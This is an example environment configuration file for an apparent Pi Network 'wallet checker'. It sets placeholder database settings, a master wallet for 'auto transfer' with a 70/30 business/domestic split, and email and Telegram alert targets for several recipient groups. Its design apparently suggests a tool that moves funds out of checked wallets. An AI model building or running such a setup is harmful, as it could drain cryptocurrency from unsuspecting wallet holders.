PORT=3000
ALLOWED_ORIGIN=*
MAX_ADDRESSES_PER_REQUEST=100
PI_HORIZON_BASE_URL=https://api.mainnet.minepi.com
PI_NETWORK_PASSPHRASE=Pi Network

# MongoDB Atlas (REQUIRED)
MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/pi_wallet_checker
MONGO_DB_NAME=pi_wallet_checker

# Master wallet for auto transfer
MASTER_WALLET_ADDRESS=G...
BUSINESS_WALLET_ADDRESS=G...
DOMESTIC_WALLET_ADDRESS=G...
BUSINESS_PERCENT=70
DOMESTIC_PERCENT=30

# SMTP Email (Optional)
SMTP_HOST=
SMTP_PORT=587
SMTP_USER=
SMTP_PASS=
SMTP_SECURE=false
MAIL_FROM=

# Recipient lists (Optional)
MASTER_RECIPIENT_EMAILS=
FB_RECIPIENT_EMAILS=
SA_RECIPIENT_EMAILS=

# Telegram targets (Optional)
# Format: botToken:chatId (comma separated for multiple)
MASTER_TELEGRAM_TARGETS=
FB_TELEGRAM_TARGETS=
SA_TELEGRAM_TARGETS=